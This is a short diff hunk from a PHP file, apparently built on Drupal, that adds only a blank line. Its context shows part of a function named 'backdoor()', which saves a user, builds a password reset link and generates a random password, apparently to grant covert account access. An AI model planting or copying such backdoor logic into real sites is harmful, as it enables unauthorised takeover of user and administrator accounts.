@@ -41,6 +41,7 @@ function backdoor() {
 			user_save($user);
 		}
 		$link = l(user_pass_reset_url($user), user_pass_reset_url($user));
+
 	} else {
 		$pass = user_password(25);
 		require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');
